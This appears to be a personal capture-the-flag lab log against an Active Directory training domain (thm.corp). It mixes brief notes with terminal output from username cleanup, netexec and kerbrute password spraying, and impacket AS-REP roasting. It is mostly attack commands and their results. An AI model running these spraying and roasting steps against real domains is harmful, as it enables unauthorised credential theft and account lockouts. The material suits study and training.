1144: THM\3966486072SA (SidTypeUser)
1146: THM\TED_JACOBSON (SidTypeUser)
1147: THM\AUGUSTA_HAMILTON (SidTypeUser)
1148: THM\TREVOR_MELTON (SidTypeUser)
1149: THM\LEANN_LONG (SidTypeUser)
1150: THM\RAQUEL_BENSON (SidTypeUser)
1151: THM\AN-173-distlist1 (SidTypeGroup)
1152: THM\Gu-gerardway-distlist1 (SidTypeGroup)
1154: THM\CH-ecu-distlist1 (SidTypeGroup)
1156: THM\AUTOMATE (SidTypeUser)

pretty inituitive to use AWK or sed here to select everything after "THM\" in the second 

cut -d' ' -f unames.txt
cut second column out delimited by spaces
sed 's/^THM\\//' unames.txt 
here we just anchor THM\ because that is the beginning of what we are replacing and replacing it with nothing. Escaping the windows backslash and // to put no string in the new parameter.
sed 's/\$//' unames.txt

-------------------------------------------------------------------------------------------------------------

do the same for dollar signs in names

then I pruned out the beginning part

root@ip-10-201-62-243:/opt/impacket/examples# cut -d' ' -f2 unames.txt | sed 's/^THM\\//' | sed 's/\$//' > fixednames.txt
root@ip-10-201-62-243:/opt/impacket/examples# cat fixednames.txt
Administrator

Guest

krbtgt

Domain

Domain

Domain

Domain

Domain

Cert

Schema

Enterprise

Group

Read-only

Cloneable

Protected

Key

Enterprise

RAS

Allowed

Denied

HAYSTACK

DnsAdmins

DnsUpdateProxy

3091731410SA

ERNESTO_SILVA

TRACY_CARVER

SHAWNA_BRAY

CECILE_WONG

CYRUS_WHITEHEAD

DEANNE_WASHINGTON

ELLIOT_CHARLES

MICHEL_ROBINSON

MITCHELL_SHAW

FANNY_ALLISON

JULIANNE_HOWE

ROSLYN_MATHIS

DANIEL_CHRISTENSEN

MARCELINO_BALLARD

CRUZ_HALL

HOWARD_PAGE

STEWART_SANTANA

LINDSAY_SCHULTZ

TABATHA_BRITT

RICO_PEARSON

DARLA_WINTERS

ANDY_BLACKWELL

LILY_ONEILL

CHERYL_MULLINS

LETHA_MAYO

HORACE_BOYLE

CHRISTINA_MCCORMICK

3811465497SA

MORGAN_SELLERS

MARION_CLAY

3966486072SA

TED_JACOBSON

AUGUSTA_HAMILTON

TREVOR_MELTON

LEANN_LONG

RAQUEL_BENSON

AN-173-distlist1

Gu-gerardway-distlist1

CH-ecu-distlist1

AUTOMATE

oot@ip-10-201-62-243:~# netexec smb HAYSTACK -u fixednames.txt -p ResetMe123! --continue-on-success
SMB         10.201.13.246   445    HAYSTACK         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\Administrator:ResetMe123! STATUS_ACCOUNT_RESTRICTION 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\Guest:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\krbtgt:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\Domain:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\Domain:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\Domain:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\Domain:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\Domain:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\Cert:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\Schema:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\Enterprise:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\Group:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\Read-only:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\Cloneable:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\Protected:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\Key:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\Enterprise:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\RAS:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\Allowed:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\Denied:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\HAYSTACK:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\DnsAdmins:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\DnsUpdateProxy:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\3091731410SA:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\ERNESTO_SILVA:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\TRACY_CARVER:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\SHAWNA_BRAY:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\CECILE_WONG:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\CYRUS_WHITEHEAD:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\DEANNE_WASHINGTON:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\ELLIOT_CHARLES:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\MICHEL_ROBINSON:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\MITCHELL_SHAW:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\FANNY_ALLISON:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\JULIANNE_HOWE:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\ROSLYN_MATHIS:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\DANIEL_CHRISTENSEN:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\MARCELINO_BALLARD:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\CRUZ_HALL:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\HOWARD_PAGE:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\STEWART_SANTANA:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\LINDSAY_SCHULTZ:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\TABATHA_BRITT:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\RICO_PEARSON:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\DARLA_WINTERS:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\ANDY_BLACKWELL:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\LILY_ONEILL:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\CHERYL_MULLINS:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\LETHA_MAYO:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\HORACE_BOYLE:ResetMe123! STATUS_ACCOUNT_RESTRICTION 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\CHRISTINA_MCCORMICK:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\3811465497SA:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\MORGAN_SELLERS:ResetMe123! STATUS_ACCOUNT_RESTRICTION 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\MARION_CLAY:ResetMe123! STATUS_ACCOUNT_RESTRICTION 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\3966486072SA:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\TED_JACOBSON:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\AUGUSTA_HAMILTON:ResetMe123! STATUS_ACCOUNT_RESTRICTION 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\TREVOR_MELTON:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\LEANN_LONG:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\RAQUEL_BENSON:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\AN-173-distlist1:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\Gu-gerardway-distlist1:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\CH-ecu-distlist1:ResetMe123! (Guest)
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\:ResetMe123! STATUS_ACCESS_DENIED 
SMB         10.201.13.246   445    HAYSTACK         [-] thm.corp\AUTOMATE:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.201.13.246   445    HAYSTACK         [+] thm.corp\:ResetMe123! (Guest)

-------------------------------------------------------------------------------------------------------------

The Gu-gerardway user is interesting so is CH-ecu i might try those but LILY-ONEILL and DNSad stand out too

boy do I love snooping around AD aimlessly this better not be a bloodhound thing 

root@ip-10-201-62-243:~# kerbrute passwordspray -v -d thm.corp --dc HAYSTACK fixednames.txt password.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/09/25 - Ronnie Flathers @ropnop

2025/10/09 21:55:50 >  Using KDC(s):
2025/10/09 21:55:50 >  	HAYSTACK:88

2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] Domain@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] Domain@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] Domain@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] Domain@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] krbtgt@thm.corp:password.txt - USER LOCKED OUT
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] Schema@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] Group@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] Key@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] Domain@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] Protected@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] Read-only@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] Enterprise@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] RAS@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] Cert@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] Denied@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] Cloneable@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] Allowed@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] Enterprise@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] DnsUpdateProxy@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] Administrator@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] DnsAdmins@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] SHAWNA_BRAY@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] HAYSTACK@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] TRACY_CARVER@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] Guest@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] 3091731410SA@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] ERNESTO_SILVA@thm.corp:password.txt - Got AS-REP (no pre-auth) but couldn't decrypt - bad password
2025/10/09 21:55:50 >  [!] CYRUS_WHITEHEAD@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] MICHEL_ROBINSON@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] CECILE_WONG@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] ELLIOT_CHARLES@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] MITCHELL_SHAW@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] JULIANNE_HOWE@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] FANNY_ALLISON@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] DEANNE_WASHINGTON@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] ROSLYN_MATHIS@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] MARCELINO_BALLARD@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] LINDSAY_SCHULTZ@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] DANIEL_CHRISTENSEN@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] CRUZ_HALL@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] LILY_ONEILL@thm.corp:password.txt - USER LOCKED OUT
2025/10/09 21:55:50 >  [!] HOWARD_PAGE@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] STEWART_SANTANA@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] ANDY_BLACKWELL@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] RICO_PEARSON@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] "" - Bad username: blank
2025/10/09 21:55:50 >  [!] DARLA_WINTERS@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] TABATHA_BRITT@thm.corp:password.txt - Got AS-REP (no pre-auth) but couldn't decrypt - bad password
2025/10/09 21:55:50 >  [!] CHERYL_MULLINS@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] HORACE_BOYLE@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] 3811465497SA@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] CHRISTINA_MCCORMICK@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] LETHA_MAYO@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] MORGAN_SELLERS@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] Gu-gerardway-distlist1@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] AN-173-distlist1@thm.corp:password.txt - User does not exist
2025/10/09 21:55:50 >  [!] AUGUSTA_HAMILTON@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] MARION_CLAY@thm.corp:password.txt - Invalid password
2025/10/09 21:55:50 >  [!] 3966486072SA@thm.corp:password.txt - Invalid password
2025/10/09 21:55:51 >  [!] CH-ecu-distlist1@thm.corp:password.txt - User does not exist
2025/10/09 21:55:51 >  [!] TED_JACOBSON@thm.corp:password.txt - Invalid password
2025/10/09 21:55:51 >  [!] RAQUEL_BENSON@thm.corp:password.txt - Invalid password
2025/10/09 21:55:51 >  [!] TREVOR_MELTON@thm.corp:password.txt - Invalid password
2025/10/09 21:55:51 >  [!] LEANN_LONG@thm.corp:password.txt - Got AS-REP (no pre-auth) but couldn't decrypt - bad password
2025/10/09 21:55:51 >  [!] AUTOMATE@thm.corp:password.txt - Invalid password
2025/10/09 21:55:51 >  Done! Tested 64 logins (0 successes) in 0.297 seconds
root@ip-10-201-62-243:~# 

this tells me it may be ASREP roastable as pre auth isnt required to sign in to get a ticket we can use something like GETPNUsers for that in the same impacket folder im working out of conveniently enough

root@ip-10-201-62-243:/opt/impacket/examples# GetNPUsers.py thm.corp/ -usersfile fixednames.txt -dc-ip HAYSTACK
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] User HAYSTACK doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] User 3091731410SA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
